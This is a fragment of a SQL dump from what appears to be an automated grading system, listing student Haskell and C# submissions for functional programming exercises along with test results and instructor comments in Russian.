(4032, 98, '3431532', '2012-11-23 07:01:46', 1, 'data Node = Node Char Node Node | Empty deriving Show\r\n\r\ntoStr Empty  =  "-"\r\ntoStr (Node x l r)   =  "<" ++ [x] ++ toStr l ++ "|" ++ toStr r ++ ">"\r\n\r\nfromStrr (''<'':x:xs)       =  [(Node x l r, u) | (l, ''|'':t) <- fromStrr xs,\r\n                                              (r, ''>'':u) <- fromStrr t]\r\n\r\nfromStrr s            	   =  [ if head s == ''-'' then (Empty, tail s) else (Node (head s) Empty Empty, tail s)  ]\r\n\r\nfromStr xs = head (map ((x,y) -> x) (fromStrr xs))', '<br/>Тесты успешно пройдены!'),
(4033, 111, '2118411', '2012-11-23 07:09:49', 1, 'data Expr = N Integer | Add Expr Expr | Mult Expr Expr | Var String\r\n        deriving Show\r\n\r\neval (N num) env = num\r\neval (Var x) env\r\n        | l == 0 = error $"Variable " ++ x ++ " not defined!"\r\n        | otherwise = snd (head tmp)\r\n        where\r\n                l = length tmp\r\n                tmp = filter ((a,b)->a==x) env\r\n\r\neval (Add e1 e2) env = eval e1 env + eval e2 env\r\neval (Mult e1 e2) env = eval e1 env * eval e2 env\r\n', '<br/>Тесты успешно пройдены!'),
(4034, 112, '2118411', '2012-11-23 07:10:11', 1, 'data Expr = N Integer | Add Expr Expr | Mult Expr Expr | Var String | Let String Integer Expr\r\n        deriving Show\r\n\r\neval (N num) env = num\r\neval (Var x) env\r\n        | l == 0 = error $"Variable " ++ x ++ " not defined!"\r\n        | otherwise = snd (head tmp)\r\n        where\r\n                l = length tmp\r\n                tmp = filter ((a,b)->a==x) env\r\n\r\neval (Add e1 e2) env = eval e1 env + eval e2 env\r\neval (Mult e1 e2) env = eval e1 env * eval e2 env\r\neval (Let x xval e) env = eval e ((x,xval):env)\r\n', '<br/>Тесты успешно пройдены!'),
(4035, 113, '2118411', '2012-11-23 07:10:26', 1, 'sum_cps [] f = f 0\r\nsum_cps (x:xs) f = sum_cps xs (f.(+x))\r\n', '<br/>Тесты успешно пройдены!'),
(4036, 114, '2118411', '2012-11-23 07:10:55', 1, 'triangle1 n = [1..n]>>= i->[1..i]\r\ntriangle2 n =\r\n        do\r\n                i<-[1..n]\r\n                [1..i]\r\n', '<br/>Тесты успешно пройдены!'),
(4037, 116, '2118411', '2012-11-23 07:11:19', 1, 'toInt ch = ch (+1) 0\r\n', '<br/>Тесты успешно пройдены!'),
(4038, 117, '2118411', '2012-11-23 07:11:37', 0, 'inc ch = (f x->f (ch f x))', 'Не удалось вычислить выражение "let c3 f x = f (f x) in toInt (inc c3)", проверьте правильность синтаксиса'),
(4039, 117, '2118411', '2012-11-23 07:13:30', 1, 'toInt ch = ch (+1) 0\r\n-------------------------------------------------\r\ninc ch = (f x->f (ch f x))\r\n', '<br/>Тесты успешно пройдены!'),
(4040, 97, '5656962', '2012-11-23 07:28:07', 1, 'checkBrackets list = if clearexpr list == [] then True else False\r\n\r\n\r\n\r\nclear (x:y:ys) = if ((x == ''('') && (y == '')'')) || ((x == ''['') && (y == '']'')) \r\n\r\n			then clear ys \r\n\r\n			else x:(clear (y:ys))\r\n\r\nclear list = list\r\n\r\n\r\n\r\nclearexpr list = let clist = clear(list) in\r\n\r\n	if length(clist) < length(list) then clear(clist)\r\n\r\n	else list\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4041, 111, '3431532', '2012-11-23 08:30:37', 1, 'data Expr = N Integer | Var String\r\n           | Mult Expr Expr\r\n           | Add  Expr Expr deriving Show\r\n\r\n\r\neval x y = evall ( repl x y)\r\n\r\nevall (N x) = x\r\nevall (Add x y)  =  (evall x) + (evall y)\r\nevall (Mult x y) = (evall x) * (evall y)\r\n\r\n\r\n\r\nrepl (Var x) ls = getVl x ls \r\nrepl (N x) ls = N x\r\nrepl (Add x y) ls =  Add (repl x ls) (repl y ls)\r\nrepl (Mult x y) ls = Mult (repl x ls) (repl y ls)\r\n\r\n\r\ngetVl x [] = N 0\r\ngetVl x ((ex, val):xs) | ex == x = N val\r\ngetVl x (y:ys) = getVl x ys \r\n', '<br/>Тесты успешно пройдены!'),
(4042, 98, '5656962', '2012-11-23 09:55:56', 1, 'data Tree = Empty | Node Char Tree Tree\r\n\r\n	deriving (Show)\r\n\r\n\r\n\r\ntoStr Empty = ""\r\n\r\ntoStr (Node x l r) = [''(''] ++ toStr l ++ ['')''] ++ [x] ++ [''(''] ++ toStr r ++ ['')'']  \r\n\r\n\r\n\r\nfromStr [] = Empty\r\n\r\nfromStr list = let rootnum = split list 0 0\r\n\r\n	           ltree = tail(take (rootnum - 1) list)\r\n\r\n		   rtree = init(drop (rootnum + 2) list)\r\n\r\n	in Node (list!!rootnum) (fromStr ltree) (fromStr rtree)\r\n\r\n\r\n\r\nsplit (x:xs) charcount brackcount = case x of\r\n\r\n	''('' -> split xs (charcount + 1) (brackcount + 1)\r\n\r\n	'')'' -> split xs (charcount + 1) (brackcount - 1)\r\n\r\n	otherwise -> if (brackcount == 0) then charcount else split xs (charcount + 1) brackcount\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4043, 111, '397095', '2012-11-23 10:13:04', 1, 'data Expr = N Integer | Add Expr Expr | Mult Expr Expr | Var String\r\n\r\neval (N n) _ = n\r\neval (Var name) vs = \r\n	let\r\n		p = head (filter (	 -> fst t == name) vs)\r\n	in\r\n		snd p\r\n\r\neval (Add e1 e2) vs = (eval e1 vs) + (eval e2 vs)\r\neval (Mult e1 e2) vs = (eval e1 vs) * (eval e2 vs)', '<br/>Тесты успешно пройдены!'),
(4044, 112, '397095', '2012-11-23 10:46:41', 1, 'data Expr = N Integer | Add Expr Expr | Mult Expr Expr | Var String | Let String Integer Expr\r\n\r\neval (N n) _ = n\r\neval (Var name) vs = \r\n	let\r\n		p = head (filter (	 -> fst t == name) vs)\r\n	in\r\n		snd p\r\n\r\neval (Add e1 e2) vs = (eval e1 vs) + (eval e2 vs)\r\neval (Mult e1 e2) vs = (eval e1 vs) * (eval e2 vs)\r\neval (Let name value e) vs = eval e ((name, value):vs)', '<br/>Тесты успешно пройдены!'),
(4045, 113, '397095', '2012-11-23 10:51:29', 1, 'sum_cps [] f = f 0\r\nsum_cps (x:xs) f = sum_cps xs (f . (+x))', '<br/>Тесты успешно пройдены!'),
(4046, 116, '397095', '2012-11-23 12:17:53', 1, 'toInt c = c (+1) 0', '<br/>Тесты успешно пройдены!'),
(4047, 117, '397095', '2012-11-23 12:20:19', 1, 'toInt c = c (+1) 0\r\ninc c = f x -> f (c f x)', '<br/>Тесты успешно пройдены!'),
(4048, 107, '3431532', '2012-11-23 12:33:12', 1, 'data LogExpr = X | T | F | Not LogExpr|  And LogExpr LogExpr | Or LogExpr LogExpr deriving Show\r\n\r\ninstance Eq LogExpr where \r\n   (==)	T F = False \r\n   (==)	F T = False \r\n   (==) x y = (calc x True == calc y True) && (calc x False == calc y False)\r\n\r\ncalc T val = True\r\ncalc F val = False\r\ncalc X val = val\r\ncalc (Not x) val = not (calc x val)\r\ncalc (And x y) val = (calc x val) && (calc y val)\r\ncalc (Or x y) val  = (calc x val) || (calc y val)\r\n', '<br/>Тесты успешно пройдены!'),
(4049, 113, '3742311', '2012-11-23 13:12:25', 2, '  --- Нет, это не по условию.. В частности, функция у вас не tail recursive\r\n  --- Попробуйте исправить, пожалуйста.\r\nsum_cps [] f = f 0\r\nsum_cps (h:t) f = f (h + (sum_cps t id))', '<br/>Тесты успешно пройдены!'),
(4050, 110, '318210', '2012-11-23 13:27:07', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace _292\r\n{\r\n    class Program\r\n    {\r\n        public static int find(Predicate<int> func, int[] a, Func<int> err) \r\n        {\r\n            int val = a.FirstOrDefault(x => func(x) == true);\r\n            if (val == 0)\r\n            {\r\n                return err();\r\n            }\r\n            else\r\n            {\r\n                return val;\r\n            }\r\n        }\r\n        static void Main(string[] args)\r\n        {\r\n            int[] a = { 11, 12, 15 };\r\n            int val = find(x => x < 10, a, () => find(x => x < 20, a, () => 20));\r\n            Console.WriteLine(val);\r\n            Console.ReadKey();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(4051, 115, '3742311', '2012-11-23 13:38:31', 0, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nfTmp [] l = []\r\nfTmp (h:[]) l = find h l\r\nfTmp (h:t) l = let (a, b) = (find h l, fTmp t l) in if a == [] || b == [] then [] else let [c] = a in (c:b)\r\n\r\nf l = sum (fTmp [(<5), (>10), (/=7)] l)', 'Выражение имеет неправильное значение: f [7, 6, 4, 3, 20, 15, 9] '),
(4052, 115, '3742311', '2012-11-23 13:44:14', 0, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nfTmp (h:[]) l = find h l\r\nfTmp (h:t) l = let (a, b) = (find h l, fTmp t l) in if a == [] || b == [] then [] else let [c] = a in (c:b)\r\n\r\nf l = sum (fTmp [(<5), (>10), (/=7)] l)', 'Выражение имеет неправильное значение: f [7, 6, 4, 3, 20, 15, 9] '),
(4053, 116, '3742311', '2012-11-23 13:47:15', 1, 'toInt cond = cond (+1) 0', '<br/>Тесты успешно пройдены!'),
(4054, 117, '3742311', '2012-11-23 13:52:35', 1, 'toInt cond = cond (+1) 0\r\ninc cond = (f x -> f (cond f x))', '<br/>Тесты успешно пройдены!'),
(4055, 111, '3742311', '2012-11-23 14:47:00', 1, 'data Expr = Add Expr Expr | Mult Expr Expr | N Integer | Var [Char]\r\n\r\nfirst _ [] err = err\r\nfirst cond (h:t) err = if (cond h) then h else first cond t err\r\n\r\neval (N i) _ = i\r\neval (Add e1 e2) s = (eval e1 s) + (eval e2 s)\r\neval (Mult e1 e2) s = (eval e1 s) * (eval e2 s)\r\neval (Var x) s = let (_, v) = first ((p, z) -> p == x) s ([], 0) in v', '<br/>Тесты успешно пройдены!'),
(4056, 112, '3742311', '2012-11-23 14:50:45', 1, 'data Expr = Add Expr Expr | Mult Expr Expr | N Integer | Var [Char] | Let [Char] Integer Expr\r\n\r\nfirst _ [] err = err\r\nfirst cond (h:t) err = if (cond h) then h else first cond t err\r\n\r\neval (N i) _ = i\r\neval (Add e1 e2) s = (eval e1 s) + (eval e2 s)\r\neval (Mult e1 e2) s = (eval e1 s) * (eval e2 s)\r\neval (Var x) s = let (_, v) = first ((p, z) -> p == x) s ([], 0) in v\r\neval (Let x i e) s = eval e ((x,i):s)', '<br/>Тесты успешно пройдены!'),
(4057, 115, '3742311', '2012-11-23 14:55:42', 1, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nfTmp (h:[]) l = find h l\r\nfTmp (h:t) l = let (a, b) = (find h l, fTmp t l) in if a == [] || b == [] then [] else let [c] = a in (c:b)\r\n\r\nf l = let s = (fTmp [(<5), (>10), (/=7)] l) in if s == [] then [] else [sum s]\r\n   --- ОК, но на самом деле можно гораздо короче, мы это разберем', '<br/>Тесты успешно пройдены!'),
(4058, 118, '3742311', '2012-11-23 15:09:10', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\ncond1 >>> cond2 = (x -> let (_, t) = cond1 x in cond2 t)', '<br/>Тесты успешно пройдены!'),
(4059, 106, '3742311', '2012-11-23 15:36:04', 2, '  --- Нет, хоть это и очень остроумно, серьезно, но сложность тут вилимо не O(N)\r\n  --- Ведь вы на каждом шагу вызвается cond, которая с каждым шагом ставноиться все сложнее и сложнее.\r\n  --- Те туть вилимо все-таки O(N^2) \r\nfindMajorTmp _ [] _ = Nothing\r\nfindMajorTmp cond (h:t) c = let newCond = (x -> if x == h then 1 + cond x else cond x) in if newCond h == c then Just h else findMajorTmp newCond t c\r\n\r\nfindMajor l = findMajorTmp (x -> 0) l (div (length l) 2 + 1)', '<br/>Тесты успешно пройдены!'),
(4060, 110, '3742311', '2012-11-23 16:28:13', 2, '   --- Нет, это правильная программа, конечно, но это не то, что называется failure continuation\r\n   --- Идея в том, грубо говоря, что FindExample надо написать без if\r\n   --- Попробуйте, это совсем не сложно.\r\nusing System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\n\r\nnamespace Task292\r\n{\r\n    public static class Program\r\n    {\r\n        public static int Find(IEnumerable<int> elements, Func<int, bool> cond, int err)\r\n        {\r\n            int result;\r\n\r\n            try\r\n            {\r\n                result = elements.First(cond);\r\n            }\r\n            catch (InvalidOperationException)\r\n            {\r\n                result = err;\r\n            }\r\n\r\n            return result;\r\n        }\r\n\r\n        public static int FindExample(IEnumerable<int> elements)\r\n        {\r\n            int result = Find(elements, x => x < 10, 10);\r\n\r\n            if (result != 10)\r\n            {\r\n                return result;\r\n            }\r\n\r\n            return Find(elements, x => x < 20, 20);\r\n        }\r\n\r\n        public static void Main(string[] args)\r\n        {\r\n            int[] elements = { 15, 23, 32 };\r\n            Console.WriteLine(FindExample(elements));\r\n\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(4061, 107, '397095', '2012-11-23 16:49:04', 1, 'data LogExpr = X | T | F | And LogExpr LogExpr | Or LogExpr LogExpr | Not LogExpr \r\n\r\ninstance Eq LogExpr where\r\n	e1 == e2 = \r\n		let\r\n			eval T _ = True\r\n			eval F _ = False\r\n			eval X  v = v\r\n			eval (And e1 e2) v = eval e1 v && eval e2 v\r\n			eval (Or e1 e2) v = eval e1 v || eval e2 v\r\n			eval (Not e) v = not (eval e v)\r\n		in\r\n			(eval e1 True == eval e2 True) && (eval e1 False == eval e2 False)', '<br/>Тесты успешно пройдены!'),
(4062, 108, 'erwert', '2012-11-23 17:26:31', 0, 'equal [] [] = True\r\nequal [] a = False\r\nequal (h:hs) l2 = equal hs [t | t <- l2, t /= h]\r\nqueens n k = foldl (a b -> if (foldl (x y -> if equal y b || x == False then False else True) True a) then (b:a) else a) [] r\r\n	where r = go [(i,j) | i <- [1..k], j <- [1..n]] k (x -> True)\r\ngo l 0 c = [[]]\r\ngo l k c = [h:hs | h <- l, c h, hs <- go l (k-1) (x -> c x && (fst h /= fst x && snd h /= snd x && abs (snd x - snd h) /= abs (fst x - fst h)))]', 'Не удалось вычислить выражение "length (queens 8 8)", проверьте правильность синтаксиса'),
(4063, 108, '3742311', '2012-11-23 17:54:07', 1, 'attack (a, b) (c, d) = let (x, y) = (a - c, b - d) in x == 0 || y == 0 || abs x == abs y\r\n\r\nqueensTmp _ _ 0 _ = [[]]\r\nqueensTmp n m k cond = let i = m + 1 - k in [(i, j):xs| j<-[1..n], cond (i, j), xs<-queensTmp n m (k - 1) ((x, y) -> cond (x, y) && not (attack (x, y) (i, j)))]\r\n\r\nqueens n k = queensTmp n k k (x -> True)', '<br/>Тесты успешно пройдены!'),
(4064, 111, '787463', '2012-11-23 18:32:58', 1, 'data Expr = Var String | N Integer | Add Expr Expr | Mult Expr Expr\r\n\r\ngetValue ((v, val):vars) x = if x == v then val else getValue vars x\r\ngetValue [] _ = 0\r\n\r\neval (Var x) vars = getValue vars x\r\neval (N n) _ = n\r\neval (Add s1 s2) n = eval s1 n + eval s2 n\r\neval (Mult m1 m2) n = eval m1 n * eval m2 n', '<br/>Тесты успешно пройдены!'),
(4065, 112, '787463', '2012-11-23 18:33:17', 1, 'data Expr = Var String | N Integer | Add Expr Expr | Mult Expr Expr | Let String Integer Expr\r\n\r\ngetValue ((v, val):vars) x = if x == v then val else getValue vars x\r\ngetValue [] _ = 0\r\n\r\neval (Var x) vars = getValue vars x\r\neval (N n) _ = n\r\neval (Add s1 s2) n = eval s1 n + eval s2 n\r\neval (Mult m1 m2) n = eval m1 n * eval m2 n\r\neval (Let x val e) vars = eval e ((x, val) : vars)', '<br/>Тесты успешно пройдены!'),
(4066, 113, '787463', '2012-11-23 18:33:32', 2, '   --- Нет, это, конечно же не по условию (нельзя использовать стандартные функции) \r\nsum_cps xs f = f (sum xs) ', '<br/>Тесты успешно пройдены!'),
(4067, 114, '787463', '2012-11-23 18:33:49', 1, 'concat1 xss = xss >>= id\r\n\r\ntriangle1 n = concat1 ([1..n] >>= i -> return [1..i])\r\ntriangle2 n =\r\n    concat1 (do i <- [1..n]\r\n                return [1..i])', '<br/>Тесты успешно пройдены!'),
(4068, 115, '787463', '2012-11-23 18:34:11', 1, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nf xs = let res = concat [find (<5) xs, find (>10) xs, find (/=7) xs] in if length res == 3 then return (sum res) else []', '<br/>Тесты успешно пройдены!'),
(4069, 116, '787463', '2012-11-23 18:34:26', 1, 'toInt churchNum = churchNum (+1) 0', '<br/>Тесты успешно пройдены!'),
(4070, 117, '787463', '2012-11-23 18:34:43', 0, 'inc churchNum = f x -> f (churchNum f x)', 'Не удалось вычислить выражение "let c3 f x = f (f x) in toInt (inc c3)", проверьте правильность синтаксиса'),
(4071, 118, '787463', '2012-11-23 18:35:37', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\n(>>>) f1 f2 xs = let (y, ys) = f1 xs in f2 ys', '<br/>Тесты успешно пройдены!'),
(4072, 117, '787463', '2012-11-23 18:47:14', 1, 'toInt churchNum = churchNum (+1) 0\r\ninc churchNum = f x -> f (churchNum f x)', '<br/>Тесты успешно пройдены!'),
(4073, 109, '787463', '2012-11-23 18:47:36', 1, 'using System;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace task_29_1\r\n\r\n{\r\n\r\n	class Task\r\n\r\n	{\r\n\r\n		private static void AllDiffLists1(int n, int k, Func<int, bool> isInSet, Action print)\r\n\r\n		{\r\n\r\n			if (k == 0)\r\n\r\n			{\r\n\r\n				print();\r\n\r\n				Console.WriteLine();\r\n\r\n				return;\r\n\r\n			}\r\n\r\n			\r\n\r\n			for (int i = 1; i < (n + 1); i++)\r\n\r\n			{\r\n\r\n				if (!isInSet(i))\r\n\r\n				{\r\n\r\n					AllDiffLists1(n, k - 1, x => isInSet(x) || x == i, () => { print(); Console.Write("{0} ", i); });\r\n\r\n				}\r\n\r\n			}\r\n\r\n		}\r\n\r\n		\r\n\r\n		public static void AllDiffLists(int n, int k) \r\n\r\n		{\r\n\r\n			AllDiffLists1(n, k, x => false, () => {});\r\n\r\n		}\r\n\r\n\r\n\r\n		static void Main(string[] args)\r\n\r\n		{\r\n\r\n			AllDiffLists(3, 2);\r\n\r\n		}\r\n\r\n	}\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(4074, 110, '787463', '2012-11-23 18:48:18', 1, 'using System;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace task_29_2\r\n\r\n{\r\n\r\n	class Task\r\n\r\n	{\r\n\r\n		public static int find(Predicate<int> f, int[] a, Func<int> err) \r\n\r\n		{\r\n\r\n			foreach (int x in a)\r\n\r\n			{\r\n\r\n				if (f(x))\r\n\r\n				{\r\n\r\n					return x;\r\n\r\n				}\r\n\r\n			}\r\n\r\n			return err();\r\n\r\n		}\r\n\r\n		\r\n\r\n		public static int find1(int[] a)\r\n\r\n		{\r\n\r\n			return find(x => x < 10, a, () => find(x => x < 20, a, () => 20));\r\n\r\n		}\r\n\r\n\r\n\r\n		static void Main(string[] args)\r\n\r\n		{\r\n\r\n			int [] a = { 21, 21, 21, 1};\r\n\r\n			int [] b = { 31, 21, 21, 11};\r\n\r\n			int [] c = { 21, 21, 21, 21};\r\n\r\n			\r\n\r\n			Console.WriteLine("{0}", find1(a));\r\n\r\n			Console.WriteLine("{0}", find1(b));\r\n\r\n			Console.WriteLine("{0}", find1(c));\r\n\r\n		}\r\n\r\n	}\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(4075, 106, '787463', '2012-11-23 18:49:02', 1, 'check'' [] _ counter = counter > 0\r\ncheck'' (x:xs) y counter = if x == y then check'' xs y (counter + 1) else check'' xs y (counter - 1)\r\n\r\ncheck _ Nothing = Nothing\r\ncheck xs (Just x) = if check'' xs x 0 then Just x else Nothing\r\n\r\nfindMajor'' [] res _ = res\r\nfindMajor'' (x:xs) Nothing 0 = findMajor'' xs (Just x) 1\r\nfindMajor'' (x:xs) (Just y) k = if x == y\r\n                               then findMajor'' xs (Just y) (k + 1)\r\n                               else if k > 1\r\n                                    then findMajor'' xs (Just y) (k - 1)\r\n                                    else findMajor'' xs Nothing 0\r\n\r\nfindMajor xs = check xs (findMajor'' xs Nothing 0)', '<br/>Тесты успешно пройдены!'),
(4076, 114, '3742311', '2012-11-23 19:36:06', 1, 'triangle1 n = [1..n]>>=(i -> [1..i]>>=(j -> return j))\r\n\r\ntriangle2 n = \r\n  do i <- [1..n]\r\n     j <- [1..i]\r\n     return j', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(4077, 109, '3742311', '2012-11-23 20:03:19', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\n\r\n\r\nnamespace Task291\r\n\r\n{\r\n\r\n    public static class Program\r\n\r\n    {\r\n\r\n        private static void AllDiffListsTmp(int n, int k, Predicate<int> used, Action outp)\r\n\r\n        {\r\n\r\n            if (k == 0)\r\n\r\n            {\r\n\r\n                outp();\r\n\r\n                Console.WriteLine();\r\n\r\n                return;\r\n\r\n            }\r\n\r\n\r\n\r\n            for (int i = 1; i <= n; ++i)\r\n\r\n            {\r\n\r\n                if (!used(i))\r\n\r\n                {\r\n\r\n                    AllDiffListsTmp(n, k - 1, x => used(x) || x == i, () => {\r\n\r\n                                                                                outp();\r\n\r\n                                                                                Console.Write(i);\r\n\r\n                                                                                Console.Write(" ");\r\n\r\n                                                                            });\r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        public static void AllDiffLists(int n, int k)\r\n\r\n        {\r\n\r\n            AllDiffListsTmp(n, k, x => false, () => { });\r\n\r\n        }\r\n\r\n\r\n\r\n        public static void Main(string[] args)\r\n\r\n        {\r\n\r\n            AllDiffLists(3, 2);\r\n\r\n\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4078, 97, '442421', '2012-11-23 20:30:05', 2, ' --- Чего-то у вас не то.. Вот такой пример не проходит\r\n ---   checkBrackets "[[]]" (выдает False)\r\n --- Попробуйте исправить, скажем до пятницы включительно.\r\n --- А я сейчас добавлю такой тест\r\ncheckBrackets x = checkBrackets'' [] x\r\n\r\ncheckBrackets'' e ('']'':xs) = replaceBracket (reverse e) ('')'':xs)\r\ncheckBrackets'' e (x:xs) = checkBrackets'' (e++[x]) xs\r\ncheckBrackets'' e [] = checkBrackets1 e\r\n\r\n\r\nreplaceBracket e x = replaceBracket'' [] e x\r\n\r\nreplaceBracket'' e (''['':es) x = checkBrackets e && checkBrackets ((reverse (e++[''('']++es))++x)\r\nreplaceBracket'' e1 (e:es) x = replaceBracket'' (e1++[e]) es x\r\nreplaceBracket'' e1 [] x = False\r\n\r\n\r\ncheckBrackets1 x = checkBrackets1'' x 0 0\r\n\r\ncheckBrackets1'' [] a b = a==b\r\ncheckBrackets1'' (''('':xs) a b = a>=b && checkBrackets1'' xs (a+1) b\r\ncheckBrackets1'' ('')'':xs) a b = a>=b && checkBrackets1'' xs a (b+1)', '<br/>Тесты успешно пройдены!'),
(4079, 111, 'Deutsche', '2012-11-23 20:34:30', 1, 'data Expr = Var String|N Integer|Add Expr Expr|Mult Expr Expr deriving (Show, Eq)\r\n\r\neval (N v) s = v\r\n-- по умолчанию если значение переменной не задано, подставляем 0\r\neval (Var str) [] = 0\r\neval (Var str) (c:s) = if (fst c == str)\r\n			then snd c\r\n		       else eval (Var str) s\r\neval (Add l r) s = (eval l s) + (eval r s)\r\neval (Mult l r) s = (eval l s) * (eval r s)', '<br/>Тесты успешно пройдены!'),
(4080, 113, 'Deutsche', '2012-11-23 20:36:14', 1, 'sum_cps [] f = f 0\r\nsum_cps (x:s) f = sum_cps s (	 -> f(t+x))', '<br/>Тесты успешно пройдены!'),
(4081, 114, 'Deutsche', '2012-11-23 20:37:13', 1, 'triangle1 n = [1..n] >>= x -> [1..x] >>= y -> return y\r\ntriangle2 n = do\r\n		x <- [1..n]\r\n		y <- [1..x]\r\n	      	return y', '<br/>Тесты успешно пройдены!'),
(4082, 115, 'Deutsche', '2012-11-23 20:37:49', 1, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nf s = if (length (find (<5) s) == 1)\r\n	then if (length (find (>10) s) == 1)\r\n		then if (length (find (/=7) s) == 1)\r\n			then [sum ((find (<5) s)++(find (>10) s)++(find (/=7) s))] \r\n                     else [] \r\n	     else []\r\n      else []', '<br/>Тесты успешно пройдены!'),
(4083, 116, 'Deutsche', '2012-11-23 20:38:18', 1, 'toInt n = n (x -> x + 1) 0\r\n', '<br/>Тесты успешно пройдены!'),
(4084, 117, 'Deutsche', '2012-11-23 20:38:46', 1, 'inc n = f -> x -> f (n f x)\r\ntoInt n = n (x -> x + 1) 0', '<br/>Тесты успешно пройдены!'),
(4085, 118, 'Deutsche', '2012-11-23 20:39:11', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n(f1 >>> f2) s = let\r\n			p1 = f1 s\r\n		in f2 (snd p1)', '<br/>Тесты успешно пройдены!'),
(4086, 111, '2562137', '2012-11-23 21:44:51', 1, 'data Expr = N Integer | Var String | Add Expr Expr | Mult Expr Expr\r\n\r\n\r\n\r\ngetVal [] name = 0 -- default value for variables\r\n\r\ngetVal (cell:mem) name = if name == fst cell then snd cell else getVal mem name\r\n\r\n\r\n\r\neval (N a) _ = a\r\n\r\neval (Var x) mem = getVal mem x\r\n\r\neval (Add e1 e2) mem = eval e1 mem + eval e2 mem\r\n\r\neval (Mult e1 e2) mem = eval e1 mem * eval e2 mem\r\n\r\n\r\n\r\ntest = (\r\n\r\n	eval (Add (Var "x") (Mult (Var "y") (N 3))) [("x", 5), ("y", 8)]\r\n\r\n	)\r\n', '<br/>Тесты успешно пройдены!'),
(4087, 112, '2562137', '2012-11-23 21:45:24', 1, 'data Expr = N Integer | Var String | Add Expr Expr | Mult Expr Expr | Let String Integer Expr\r\n\r\n\r\n\r\ngetVal [] name = 0 -- default value for variables\r\n\r\ngetVal (cell:mem) name = if name == fst cell then snd cell else getVal mem name\r\n\r\n\r\n\r\neval (N a) _ = a\r\n\r\neval (Var x) mem = getVal mem x\r\n\r\neval (Add e1 e2) mem = eval e1 mem + eval e2 mem\r\n\r\neval (Mult e1 e2) mem = eval e1 mem * eval e2 mem\r\n\r\neval (Let x v e) mem = eval e ((x,v):mem)\r\n\r\n\r\n\r\ntest = (\r\n\r\n	eval (Add (Let "x" 10 (Mult (Var "x") (Var "y"))) (N 1)) [("y", 2)]\r\n\r\n	)\r\n', '<br/>Тесты успешно пройдены!'),
(4088, 115, '2562137', '2012-11-23 21:45:46', 1, 'find cond [] = []\r\n\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\n\r\n\r\nf list = [x+y+z | x <- find (<5) list, y <- find (>10) list, z <- find (/=7) list]\r\n\r\n\r\n\r\ntest = (\r\n\r\n    f [7, 6, 4, 3, 20, 15, 9],\r\n\r\n    f [7, 6, 4, 3, 9]\r\n\r\n	)\r\n', '<br/>Тесты успешно пройдены!'),
(4089, 116, '2562137', '2012-11-23 21:46:01', 1, 'toInt n = n (+1) 0\r\n\r\n\r\n\r\ntest = (\r\n\r\n    toInt (f x -> f (f (f x)))\r\n\r\n	)\r\n', '<br/>Тесты успешно пройдены!'),
(4090, 117, '2562137', '2012-11-23 21:46:16', 1, 'toInt n = n (+1) 0\r\n\r\n\r\n\r\ninc n = (f x -> f (n f x))\r\n\r\n\r\n\r\ntest = (\r\n\r\n	toInt (inc (inc (inc (f x -> f (f (f x))))))\r\n\r\n	)\r\n', '<br/>Тесты успешно пройдены!'),
(4091, 118, '2562137', '2012-11-23 21:51:35', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\n\r\n\r\n(>>>) :: ([a] -> (a,[a])) -> ([a] -> (a,[a])) -> ([a] -> (a,[a]))\r\n\r\n\r\n\r\n(>>>) f g = list -> g (snd (f list))\r\n\r\n\r\n\r\nf = find (>3) >>> find (>3) \r\n\r\n\r\n\r\ntest = (\r\n\r\n	f [1, 3, 5, 2, 20, 25, 2]\r\n\r\n	)\r\n', '<br/>Тесты успешно пройдены!'),
(4092, 97, '51559263', '2012-11-23 22:36:16', 1, 'f [] [] = True\r\n\r\n\r\n\r\nf [] _ = False\r\n\r\n\r\n\r\nf ( x : xs ) [] = f xs [x]\r\n\r\n\r\n\r\nf ( x : xs) ( y : ys ) = if x == ''('' || x == ''[''\r\n\r\n                         then f xs ( x : y : ys )\r\n\r\n						 else if ( x == '')'' && y == ''['' ) || ( x == '']'' && y == ''('' )\r\n\r\n						      then False\r\n\r\n							  else f xs ys\r\n\r\n							  \r\n\r\ncheckBrackets [] = True\r\n\r\n					  \r\n\r\ncheckBrackets xs = f xs []\r\n', '<br/>Тесты успешно пройдены!'),
